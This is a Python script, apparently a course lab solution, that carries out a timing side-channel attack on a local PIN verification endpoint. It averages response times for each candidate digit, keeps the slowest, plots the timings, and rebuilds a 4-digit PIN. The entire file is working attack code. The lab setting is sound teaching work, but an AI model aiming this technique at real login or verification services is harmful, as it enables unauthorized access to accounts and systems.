import sys
import time
import requests
import matplotlib.pyplot as plt


# Target configuration
URL = "http://127.0.0.1:5000/verify"
STUDENT_ID = "085"  # TODO: Put your student id (last 3 digits)
HEADERS = {"X-Student-ID": STUDENT_ID, "Content-Type": "application/json"}

# Attack configuration parameters
PIN_LENGTH = 4
SAMPLES_PER_GUESS = 10 # Number of samples per digit to average out noise
DIGITS = "0123456789"

def plot_timings(position_timings ,position, known_prefix_before):
    labels = []
    times = []
    for digit in DIGITS:
        full_candidate = known_prefix_before + digit + "0" * (PIN_LENGTH - len(known_prefix_before) - 1)
        labels.append(full_candidate)
        times.append(position_timings[digit])

    plt.barh(labels, times)
    plt.xlabel("Time Elapsed (ms)")
    plt.gca().invert_yaxis() 
    plt.title(f"PIN Position {position}")
    plt.savefig(f"position_{position}_timing.png")
    plt.close()
    print(f"Saved position_{position}_timing.png")


def measure_response_time(candidate_pin: str) -> float:
  """Sends a request to the target server and returns the elapsed time in milliseconds."""
  start_time = time.perf_counter()
  try:
    response = requests.post(
        URL, json={"pin": candidate_pin}, headers=HEADERS, timeout=5
    )
    elapsed_ms = (time.perf_counter() - start_time) * 1000
    return elapsed_ms, response.status_code
  except requests.RequestException as e:
    print(f"\n[!] Error connecting to target server: {e}")
    sys.exit(1)


def get_average_timing(candidate_pin: str, samples: int) -> tuple[float, bool]:
  """Averages response times across multiple samples to smooth out system noise."""
  
  # TODO: Request sample number of times and return average elapsed time and whether the request was a success
  timimg = []
  success =False

  for _ in range(samples) :
    elapsed_time , status = measure_response_time(candidate_pin)
    timimg.append(elapsed_time)

    if status == 200 :
      success = True
    
  avg_time = sum(timimg)/len(timimg)
  
  return avg_time, success


def recover_secret_pin():
  print("=" * 60)
  print(f" Starting Timing Attack Exploit against {URL}")
  print(f" Target Student ID : {STUDENT_ID}")
  print(f" Samples per guess : {SAMPLES_PER_GUESS}")
  print("=" * 60 + "\n")
  
  known_prefix = ""

  # TODO: Use the methods to build up the secret pin
  for position in range(PIN_LENGTH) :
    best_digit = None 
    best_time = -1
    position_timings = {}

    for digit in DIGITS :
      candiadate = known_prefix + digit + "0"*(PIN_LENGTH-len(known_prefix)-1)
      avg_time, success = get_average_timing(candiadate, SAMPLES_PER_GUESS)
      # print(f"    Position {position}, digit {digit}: {avg_time:.4f} ms")
      position_timings[digit] = avg_time

      # if success :
      #   return candiadate

      if avg_time > best_time :
        best_time = avg_time
        best_digit = digit

    plot_timings(position_timings,position,known_prefix)
    known_prefix += best_digit
    # print(f"[+] Position {position} solved: '{best_digit}' -> known so far: {known_prefix}\n")  

  

  # Final verification check
  print("[*] Verifying recovered PIN with server...")
  avg_time, is_success = get_average_timing(known_prefix, samples=1)
  if is_success:
    print("\n" + "=" * 60)
    print(f"[+] VERIFIED! Recovered PIN: {known_prefix}")
    print("=" * 60)
  else:
    print("\n[-] Failed to verify recovered PIN. Consider increasing SAMPLES_PER_GUESS.")


if __name__ == "__main__":
   recover_secret_pin()
  # elapsed_time , status = measure_response_time("1000")
  # print(elapsed_time, status)